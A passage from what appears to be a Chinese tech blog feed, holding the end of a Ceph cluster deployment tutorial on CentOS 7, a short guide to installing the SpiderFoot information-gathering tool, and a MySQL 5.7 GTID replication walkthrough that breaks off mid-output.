<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">[root@node1 ~]# cat /etc/redhat-release </div><div class="line">CentOS Linux release 7.3.1611 (Core) </div><div class="line"></div><div class="line">[root@node1 ~]# lsblk</div><div class="line">NAME            MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT</div><div class="line">sda               8:0    0  100G  0 disk </div><div class="line">├─sda1            8:1    0  500M  0 part /boot</div><div class="line">└─sda2            8:2    0 99.5G  0 part </div><div class="line">  ├─system-root 253:0    0 95.6G  0 lvm  /</div><div class="line">  └─system-swap 253:1    0  3.9G  0 lvm  [SWAP]</div><div class="line">sdb               8:16   0    2T  0 disk </div><div class="line">sdc               8:32   0    2T  0 disk </div><div class="line">sdd               8:48   0    2T  0 disk </div><div class="line"></div><div class="line">[root@node1 ~]# cat /etc/hosts</div><div class="line">192.168.138.140 admin</div><div class="line">192.168.138.141 node1</div><div class="line">192.168.138.142 node2</div><div class="line">192.168.138.143 node3</div></pre></td></tr></table></figure>
<p>集群配置如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">admin	192.168.138.140  deploy</div><div class="line">node1   192.168.138.141  mon*1 osd*3</div><div class="line">node2   192.168.138.142  mon*1 osd*3</div><div class="line">node3   192.168.138.143  mon*1 osd*3</div></pre></td></tr></table></figure></p>
<p>备注:在生产环境,每个osd对应一块硬盘,每个osd需要一个journal,建议使用ssd作为osd硬盘的journal.<br>这里测试环境将采用data和journal在一个硬盘的做法</p>
<h5 id="预检Preflight"><a href="#预检Preflight" class="headerlink" title="预检Preflight"></a><b>预检Preflight</b></h5><p>在admin node 节点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">1. install epel</div><div class="line">sudo yum install -y https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm</div><div class="line">2. add ceph source</div><div class="line">sudo cat &gt; /etc/yum.repos.d/ceph-deploy.repo &lt;&lt; EOF</div><div class="line">[ceph-noarch]</div><div class="line">name=Ceph noarch packages</div><div class="line">baseurl=https://download.ceph.com/rpm-kraken/el7/noarch</div><div class="line">enabled=1</div><div class="line">gpgcheck=1</div><div class="line">type=rpm-md</div><div class="line">gpgkey=https://download.ceph.com/keys/release.asc</div><div class="line">EOF</div><div class="line">3. install ceph-deploy</div><div class="line">sudo yum update &amp;&amp; sudo yum install ceph-deploy -y</div></pre></td></tr></table></figure></p>
<p>在admin node上创建一个拥有sudo权限的用户，并有sudo权限,不要使用ceph这个用户名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">sudo useradd -g wheel  neo &amp;&amp; su - neo</div><div class="line"></div><div class="line">ssh-keygen</div><div class="line">ssh-copy-id neo@node1</div><div class="line">ssh-copy-id neo@node2</div><div class="line">ssh-copy-id neo@node3</div></pre></td></tr></table></figure></p>
<p>如果开启了防火墙需要<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">sudo firewall-cmd --zone=public --add-service=ceph-mon --permanent</div><div class="line">sudo firewall-cmd --zone=public --add-service=ceph --permanent</div><div class="line">sudo firewalld-cmd --reload</div><div class="line">或者</div><div class="line"># firewall-cmd --zone=public --add-port=6789/tcp --permanent</div><div class="line"># firewall-cmd --zone=public --add-port=6800-7100/tcp --permanent</div><div class="line"># firewall-cmd --reload</div></pre></td></tr></table></figure></p>
<p>For iptables, add port 6789 for Ceph Monitors and ports 6800:7300 for Ceph OSDs</p>
<h5 id="开始安装"><a href="#开始安装" class="headerlink" title="开始安装"></a><b>开始安装</b></h5><p>1.建立部署目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[neo@admin ~]$ ceph-deploy --version</div><div class="line">1.5.37</div><div class="line">[neo@admin ~]$ mkdir cluster</div><div class="line">[neo@admin ~]$ cd cluster/</div></pre></td></tr></table></figure></p>
<p>2.清理旧配置,全新安装略过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ceph-deploy purge node1 node2 node3</div><div class="line">ceph-deploy purgedata node1 node2 node3</div><div class="line">ceph-deploy forgetkeys</div></pre></td></tr></table></figure></p>
<p>3.Create the cluster<br>初始化集群，告诉 ceph-deploy 哪些节点是监控节点，命令成功执行后会在 cluster 目录下生成 ceph.conf, ceph.log, ceph.mon.keyring 等相关文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[neo@admin cluster]$ ceph-deploy new node1 node2 node3</div></pre></td></tr></table></figure></p>
<p>4.在每个 Ceph 节点上都安装 Ceph：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[neo@admin cluster]$ ceph-deploy install node1 node2 node3</div><div class="line">或者登陆节点,手动安装</div><div class="line">yum -y install ceph ceph-radosgw</div></pre></td></tr></table></figure></p>
<p>5.初始化监控节点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[neo@admin cluster]$ ceph-deploy mon create-initial</div></pre></td></tr></table></figure></p>
<p>6.查看一下 Ceph 存储节点的硬盘情况<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[neo@admin cluster]$ ceph-deploy disk list node1</div><div class="line">[neo@admin cluster]$ ceph-deploy disk list node2</div><div class="line">[neo@admin cluster]$ ceph-deploy disk list node3</div></pre></td></tr></table></figure></p>
<p>7.初始化 Ceph 硬盘，然后创建 osd 存储节点,(存储节点:单个硬盘:对应的 journal 分区，一一对应)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">ceph-deploy disk zap node1:sdb node1:sdc node1:sdd </div><div class="line">ceph-deploy osd create node1:sdb node1:sdc node1:sdd </div><div class="line"></div><div class="line">ceph-deploy disk zap node2:sdb node2:sdc node2:sdd </div><div class="line">ceph-deploy osd create node2:sdb node2:sdc node2:sdd </div><div class="line"></div><div class="line">ceph-deploy disk zap node3:sdb node3:sdc node3:sdd</div><div class="line">ceph-deploy osd create node3:sdb node3:sdc node3:sdd</div></pre></td></tr></table></figure></p>
<p>8.最后，我们把生成的配置文件从 ceph-adm 同步部署到其他几个节点，使得每个节点的 ceph 配置一致：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[neo@admin cluster]$ ceph-deploy --overwrite-conf admin admin node1 node2 node3</div></pre></td></tr></table></figure>
<h5 id="测试"><a href="#测试" class="headerlink" title="测试"></a><b>测试</b></h5><p>看一下配置成功了没？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">[root@admin ~]# ceph -s</div><div class="line">    cluster d6d92de4-2a08-4bd6-a749-6c104c88fc40</div><div class="line">     health HEALTH_WARN</div><div class="line">            too few PGs per OSD (21 &lt; min 30)</div><div class="line">     monmap e1: 3 mons at &#123;node1=192.168.138.141:6789/0,node2=192.168.138.142:6789/0,node3=192.168.138.143:6789/0&#125;</div><div class="line">            election epoch 6, quorum 0,1,2 node1,node2,node3</div><div class="line">     osdmap e53: 9 osds: 9 up, 9 in</div><div class="line">            flags sortbitwise,require_jewel_osds</div><div class="line">      pgmap v148: 64 pgs, 1 pools, 0 bytes data, 0 objects</div><div class="line">            307 MB used, 18377 GB / 18378 GB avail</div><div class="line">                  64 active+clean</div><div class="line">[root@admin ~]# ceph health</div><div class="line">HEALTH_WARN too few PGs per OSD (21 &lt; min 30)</div></pre></td></tr></table></figure></p>
<p>备注: 这里需要注意的事执行命令是在root权限下执行的，<br>因为etc/ceph/ceph.client.admin.keyring权限只允许root读写导致，亦可以给文件加权限解决<br>如果在neo权限下,报错如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[neo@admin cluster]$ ceph health</div><div class="line">2017-05-27 16:58:23.374074 7f567813a700 -1 auth: unable to find a keyring on /etc/ceph/ceph.client.admin.keyring,/etc/ceph/ceph.keyring,/etc/ceph/keyring,/etc/ceph/keyring.bin: (2) No such file or directory</div><div class="line">2017-05-27 16:58:23.374109 7f567813a700 -1 monclient(hunting): ERROR: missing keyring, cannot use cephx for authentication</div><div class="line">2017-05-27 16:58:23.374113 7f567813a700  0 librados: client.admin initialization error (2) No such file or directory</div><div class="line">Error connecting to cluster: ObjectNotFound</div></pre></td></tr></table></figure></p>
<p>在我们执行ceph -s 时警告PG太少,我们接下来解决,由于是新配置的集群，只有一个pool</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[neo@admin ~]$ sudo ceph osd lspools</div><div class="line">0 rbd,</div></pre></td></tr></table></figure>
<p>查看rbd pool的PGS<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[neo@admin ~]$ sudo ceph osd pool get rbd pg_num</div><div class="line">pg_num: 64</div></pre></td></tr></table></figure></p>
<p>pgs为64，因为是3副本的配置，所以当有9个osd的时候, 每个osd上均分了64/9<em>3=21个pgs,也就是出现了如上的错误 小于最小配置30个<br>根据<a href="http://docs.ceph.com/docs/master/rados/configuration/pool-pg-config-ref/" target="_blank" rel="external">官方推荐</a>,Total PGs = (#OSDs </em> 100) / pool size 公式来决定 pg_num（pgp_num 应该设成和 pg_num 一样）,我们可以算出 100*9/3=300,Ceph推荐取最接近2的指数倍，所以选择256<br>解决办法：修改默认pool rbd的pgs和pgp_num,默认两个pg_num和pgp_num一样大小均为64，此处也将两个的值都设为256<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">[neo@admin ~]$ sudo ceph osd pool set rbd pg_num 256</div><div class="line">set pool 0 pg_num to 256</div><div class="line"></div><div class="line">[neo@admin ~]$ sudo ceph osd pool set rbd pgp_num 256</div><div class="line">set pool 0 pgp_num to 128set pool 0 pgp_num to 256</div><div class="line"></div><div class="line">[neo@admin ~]$ sudo ceph health</div><div class="line">HEALTH_OK</div><div class="line"></div><div class="line">[neo@admin ~]$ sudo ceph -s</div><div class="line">    cluster d6d92de4-2a08-4bd6-a749-6c104c88fc40</div><div class="line">     health HEALTH_OK</div><div class="line">     monmap e1: 3 mons at &#123;node1=192.168.138.141:6789/0,node2=192.168.138.142:6789/0,node3=192.168.138.143:6789/0&#125;</div><div class="line">            election epoch 18, quorum 0,1,2 node1,node2,node3</div><div class="line">     osdmap e116: 9 osds: 9 up, 9 in</div><div class="line">            flags sortbitwise,require_jewel_osds</div><div class="line">      pgmap v412: 256 pgs, 1 pools, 4 bytes data, 1 objects</div><div class="line">            324 MB used, 18377 GB / 18378 GB avail</div><div class="line">                 256 active+clean</div></pre></td></tr></table></figure></p>
<p>ref<br><a href="http://www.xuxiaopang.com/2016/10/10/ceph-full-install-el7-jewel/" target="_blank" rel="external">CEPH部署完整版(el7+jewel)</a><br><a href="http://ceph.com/install/" target="_blank" rel="external">INSTALL CEPH (QUICK)</a><br><a href="http://www.codexiu.cn/linux/blog/42056/" target="_blank" rel="external">centos7 ceph-deploy 安装jewel</a><br><a href="http://zedshadow.leanote.com/post/%E4%BD%BF%E7%94%A8ceph-deploy%E5%BF%AB%E9%80%9F%E9%83%A8%E7%BD%B2Ceph" target="_blank" rel="external">centos7使用ceph-deploy快速部署Kraken版Ceph</a><br><a href="http://www.vpsee.com/2015/07/install-ceph-on-centos-7/" target="_blank" rel="external">在 CentOS 7.1 上安装分布式存储系统 Ceph</a><br><a href="http://www.cnblogs.com/zhangzhengyan/p/5839897.html" target="_blank" rel="external">ceph 创建和删除osd</a><br><a href="http://blog.csdn.net/xiongwenwu/article/details/53120415" target="_blank" rel="external">三种增删osd的方法数据量迁移大小</a><br><a href="https://www.virtualtothecore.com/en/quickly-build-a-new-ceph-cluster-with-ceph-deploy-on-centos-7/" target="_blank" rel="external">Quickly build a new Ceph cluster with ceph-deploy on CentOS 7</a><br><a href="http://blog.csdn.net/chinagissoft/article/details/50491429" target="_blank" rel="external">Ceph 集群部署</a><br><a href="https://my.oschina.net/diluga/blog/528618" target="_blank" rel="external">PG设置与规划</a><br><a href="https://my.oschina.net/xiaozhublog/blog/664560" target="_blank" rel="external">health HEALTH_WARN too few PGs per OSD</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h5 id=&quot;概念介绍&quot;&gt;&lt;a href=&quot;#概念介绍&quot; class=&quot;headerlink&quot; title=&quot;概念介绍&quot;&gt;&lt;/a&gt;&lt;b&gt;概念介绍&lt;/b&gt;&lt;/h5&gt;&lt;p&gt;Ceph的部署模式下主要包含以下几个类型的节点:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Ceph OSD: 主要用来存储数
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Install SpiderFoot on Centos7</title>
    <link href="https://t1ger.github.io/2017/05/25/Install-SpiderFoot-on-centos7/"/>
    <id>https://t1ger.github.io/2017/05/25/Install-SpiderFoot-on-centos7/</id>
    <published>2017-05-25T09:48:22.000Z</published>
    <updated>2017-05-25T09:20:40.754Z</updated>
    
    <content type="html"><![CDATA[<h5 id="简介"><a href="#简介" class="headerlink" title="简介"></a><b>简介</b></h5><p>SpiderFoot是一个Python编写的免费开源的网站信息收集类工具，并且支持跨平台运行，适用于Linux、*BSD和Windows系统。<br>此外，它还为用户提供了一个易于使用的GUI界面。<br>在功能方面SpiderFoot也为我们考虑的非常周全，通过SpiderFoot我们可以获取相关目标的各种信息，例如网站子域、电子邮件地址、web服务器版本等等。<br>SpiderFoot简单的基于Web的界面，使你能够在安装后立即启动扫描 – 只需简单的设置扫描目标域名，并启用相应的扫描模块即可</p>
<h5 id="环境依赖"><a href="#环境依赖" class="headerlink" title="环境依赖"></a><b>环境依赖</b></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install lxml netaddr M2Crypto cherrypy mako requests bs4</div></pre></td></tr></table></figure>
<h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a><b>安装</b></h5><p><a href="http://www.spiderfoot.net/download/" target="_blank" rel="external">点击这里下载</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">~$ tar zxvf spiderfoot-X.X.X-src.tar.gz</div><div class="line">~$ cd spiderfoot-X.X.X</div><div class="line">~/spiderfoot-X.X.X$</div></pre></td></tr></table></figure></p>
<h6 id=""><a href="#" class="headerlink" title=""></a><b?启动 spiderfoot<="" b=""></b?启动></h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">python ./sf.py</div><div class="line">or</div><div class="line">python ./sf.py 0.0.0.0:5001</div><div class="line"></div><div class="line">也可以指定端口</div><div class="line">python ./sf.py 127.0.0.1:9999</div></pre></td></tr></table></figure>
<h5 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a><b>遇到的问题</b></h5><ol>
<li><p>Python.h：No such file or directory<br>出现No such file or directory的错误，有两种情况，一种是真的没有Python.h这个文件，一种是Python的版本不对<br>可以进入/usr/include/文件夹下的Python2.x文件夹里查找是否有Python.h这个文件<br>这里是第一种,yum install python-devel 解决</p>
</li>
<li><p>fatal error: openssl/err.h:<br>执行 yum install openssl-devel 解决</p>
</li>
</ol>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h5 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;&lt;b&gt;简介&lt;/b&gt;&lt;/h5&gt;&lt;p&gt;SpiderFoot是一个Python编写的免费开源的网站信息收集类工具，并且支持跨平台运行，适用于Linux、*BSD和Wi
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>mysql5.7 Replication with Gtid</title>
    <link href="https://t1ger.github.io/2017/05/22/mysql5-7-Replication-with-Gtid/"/>
    <id>https://t1ger.github.io/2017/05/22/mysql5-7-Replication-with-Gtid/</id>
    <published>2017-05-22T10:10:42.000Z</published>
    <updated>2017-05-23T07:44:30.068Z</updated>
    
    <content type="html"><![CDATA[<p>测试介绍: 一主一从<br>运行环境:<br>centos7.3、mysql5.7.17</p>
<h5 id="理论准备"><a href="#理论准备" class="headerlink" title="理论准备"></a><b>理论准备</b></h5><ul>
<li><p>GTID工作原理</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">1. master更新数据时，会在事务前产生GTID，一同记录到binlog日志中</div><div class="line">2. slave端的i/o 线程将变更的binlog，写入到本地的relay log中</div><div class="line">3. sql线程从relay log中获取GTID，然后对比slave端的binlog是否有记录</div><div class="line">4. 如果有记录，说明该GTID的事务已经执行，slave会忽略</div><div class="line">5. 如果没有记录，slave就会从relay log中执行该GTID的事务，并记录到binlog</div><div class="line">6. 在解析过程中会判断是否有主键，如果没有就用二级索引，如果没有就用全部扫描</div></pre></td></tr></table></figure>
</li>
<li><p>GTID相关概念</p>
</li>
</ul>
<ol>
<li>GTID = server_uuid:transaction_id<br>server_uuid由MySQL在第一次启动时自动生成并被持久化到auto.cnf文件里，TID（transaction_id）是一个从1开始的自增计数，表示在这个主库上执行的第n个事务。MySQL会保证事务与GTID之间的1 : 1映射</li>
<li>server_uuid 来源于 auto.cnf<br>数据目录下有一个auto.cnf文件就是用来保存server_uuid</li>
<li>GTID: 在一组复制中，全局唯一<br>MySQL只要保证每台数据库的server_uuid全局唯一，以及每台数据库生成的transaction_id自身唯一，就能保证GTID的全局唯一性</li>
<li>gtid_executed<br>在当前实例上执行过的GTID集合; 实际上包含了所有记录到binlog中的事务。所以，设置set sql_log_bin=0后执行的事务不会生成binlog 事件，也不会被记录到gtid_executed中。执行RESET MASTER可以将该变量置空</li>
<li>gtid_purged<br>gtid_purged用于记录已经被清除了的binlog事务集合，它是gtid_executed的子集。只有gtid_executed为空时才能手动设置该变量，此时会同时更新gtid_executed为和gtid_purged相同的值。gtid_executed为空意味着要么之前没有启动过基于GTID的复制，要么执行过RESET MASTER。执行RESET MASTER时同样也会把gtid_purged置空，即始终保持gtid_purged是gtid_executed的子集</li>
<li><p>gtid_next<br>AUTOMATIC:自动生成下一个GTID，实现上是分配一个当前实例上尚未执行过的序号最小的GTID<br>ANONYMOUS:设置后执行事务不会产生GTID<br>显式指定的GTID:可以指定任意形式合法的GTID值，但不能是当前gtid_executed中的已经包含的GTID，否则，下次执行事务时会报错</p>
<p> 更多详情参考<a href="https://dev.mysql.com/doc/refman/5.7/en/replication-options-gtids.html" target="_blank" rel="external">replication-options-gtids</a></p>
</li>
</ol>
<ul>
<li><p>开启GTID的必备条件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">gtid_mode=ON(必选)  </div><div class="line">enforce-gtid-consistency（必选）</div><div class="line">log_bin=ON（可选）--高可用切换，最好设置ON  </div><div class="line">log-slave-updates=ON（可选）--高可用切换，最好设置ON</div></pre></td></tr></table></figure>
</li>
<li><p>GTID的不足</p>
</li>
</ul>
<ol>
<li>无法使用 CREATE TABLE … SELECT statements语句</li>
<li>无法在事务中使用 CREATE TEMPORARY TABLE</li>
<li>无法在事务中对非事务存储引擎进行更新</li>
<li>具体可参考: <a href="https://dev.mysql.com/doc/refman/5.7/en/replication-gtids-restrictions.html" target="_blank" rel="external">Restrictions on Replication with GTIDs</a></li>
</ol>
<h5 id="复制实现"><a href="#复制实现" class="headerlink" title="复制实现"></a><b>复制实现</b></h5><ul>
<li><p>这里我们的测试环境如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">master ip: 192.168.1.105</div><div class="line">slave ip : 192.168.1.106</div><div class="line">复制账户:</div><div class="line">root@localhost [(none)] &gt; CREATE USER &apos;repl&apos;@&apos;192.169.1.%&apos; IDENTIFIED BY &apos;repl_123456&apos;;</div><div class="line">Query OK, 0 rows affected (0.13 sec)</div><div class="line">root@localhost [(none)] &gt; GRANT REPLICATION SLAVE ON *.* TO &apos;repl&apos;@&apos;192.168.1.%&apos;;</div><div class="line">Query OK, 0 rows affected (0.00 sec)</div></pre></td></tr></table></figure>
</li>
<li><p>全新开始搭建</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div></pre></td><td class="code"><pre><div class="line">1. 所有server处于同一状态</div><div class="line">	mysql&gt; SET @@global.read_only = ON;</div><div class="line">2. 关闭所以mysql</div><div class="line">    mysqladmin -uusername -p shutdown</div><div class="line">3. 配置my.cnf开启GTID,重启mysql</div><div class="line">    root@localhost [(none)] &gt; show global variables like &apos;%gtid%&apos;;</div><div class="line">    +----------------------------------+-------+</div><div class="line">    | Variable_name                    | Value |</div><div class="line">    +----------------------------------+-------+</div><div class="line">    | binlog_gtid_simple_recovery      | ON    |</div><div class="line">    | enforce_gtid_consistency         | ON    |</div><div class="line">    | gtid_executed                    |       |</div><div class="line">    | gtid_executed_compression_period | 1000  |</div><div class="line">    | gtid_mode                        | ON    |</div><div class="line">    | gtid_owned                       |       |</div><div class="line">    | gtid_purged                      |       |</div><div class="line">    | session_track_gtids              | OFF   |</div><div class="line">    +----------------------------------+-------+</div><div class="line">    8 rows in set (0.01 sec)</div><div class="line">    </div><div class="line">    root@localhost [(none)] &gt; show variables like &apos;%gtid_next%&apos;;</div><div class="line">    +---------------+-----------+</div><div class="line">    | Variable_name | Value     |</div><div class="line">    +---------------+-----------+</div><div class="line">    | gtid_next     | AUTOMATIC |</div><div class="line">    +---------------+-----------+</div><div class="line">    1 row in set (0.01 sec)</div><div class="line">	</div><div class="line">或者</div><div class="line">   mysqld --gtid-mode=ON --log-bin --enforce-gtid-consistency &amp;</div><div class="line">	</div><div class="line">4. change master </div><div class="line">   mysql&gt; change master to</div><div class="line">         master_host=host,</div><div class="line">         master_port=port,</div><div class="line">         master_user=username,</div><div class="line">         master_password=password,</div><div class="line">         master_auto_position=1;</div><div class="line">   mysql&gt; start slave;</div><div class="line">   </div><div class="line">   root@localhost [(none)] &gt; CHANGE MASTER TO  MASTER_HOST=&apos;192.168.1.105&apos;,MASTER_PORT=3306,MASTER_USER=&apos;repl&apos;,MASTER_PASSWORD=&apos;repl_123456&apos;,MASTER_AUTO_POSITION=1;</div><div class="line">	Query OK, 0 rows affected, 2 warnings (0.16 sec)</div><div class="line">   root@localhost [(none)] &gt; start slave;</div><div class="line">	Query OK, 0 rows affected (0.01 sec)</div><div class="line">	</div><div class="line">   root@localhost [(none)] &gt; show slave status\G;</div><div class="line">*************************** 1. row ***************************</div><div class="line">               Slave_IO_State: Waiting for master to send event</div><div class="line">                  Master_Host: 192.168.1.105</div><div class="line">                  Master_User: repl</div><div class="line">                  Master_Port: 3306</div><div class="line">                Connect_Retry: 60</div><div class="line">              Master_Log_File: mysql-bin.000001</div><div class="line">          Read_Master_Log_Pos: 154</div><div class="line">               Relay_Log_File: localhost-relay-bin.000003</div><div class="line">                Relay_Log_Pos: 367</div><div class="line">        Relay_Master_Log_File: mysql-bin.000001</div><div class="line">             Slave_IO_Running: Yes</div><div class="line">            Slave_SQL_Running: Yes</div><div class="line">              Replicate_Do_DB: </div><div class="line">          Replicate_Ignore_DB: </div><div class="line">           Replicate_Do_Table: </div><div class="line">       Replicate_Ignore_Table: </div><div class="line">      Replicate_Wild_Do_Table: </div><div class="line">  Replicate_Wild_Ignore_Table: </div><div class="line">                   Last_Errno: 0</div><div class="line">                   Last_Error: </div><div class="line">                 Skip_Counter: 0</div><div class="line">          Exec_Master_Log_Pos: 154</div><div class="line">              Relay_Log_Space: 791</div><div class="line">              Until_Condition: None</div><div class="line">               Until_Log_File: </div><div class="line">                Until_Log_Pos: 0</div><div class="line">           Master_SSL_Allowed: No</div><div class="line">           Master_SSL_CA_File: </div><div class="line">           Master_SSL_CA_Path: </div><div class="line">              Master_SSL_Cert: </div><div class="line">            Master_SSL_Cipher: </div><div class="line">               Master_SSL_Key: </div><div class="line">        Seconds_Behind_Master: 0</div><div class="line">Master_SSL_Verify_Server_Cert: No</div><div class="line">                Last_IO_Errno: 0</div><div class="line">                Last_IO_Error: </div><div class="line">               Last_SQL_Errno: 0</div><div class="line">               Last_SQL_Error: </div><div class="line">  Replicate_Ignore_Server_Ids: </div><div class="line">             Master_Server_Id: 233</div><div class="line">                  Master_UUID: 3288e218-3ecc-11e7-8f0d-005056b2706f</div><div class="line">             Master_Info_File: mysql.slave_master_info</div><div class="line">                    SQL_Delay: 0</div><div class="line">          SQL_Remaining_Delay: NULL</div><div class="line">      Slave_SQL_Running_State: Slave has read all relay log; waiting for more updates</div><div class="line">           Master_Retry_Count: 86400</div><div class="line">                  Master_Bind: </div><div class="line">      Last_IO_Error_Timestamp: 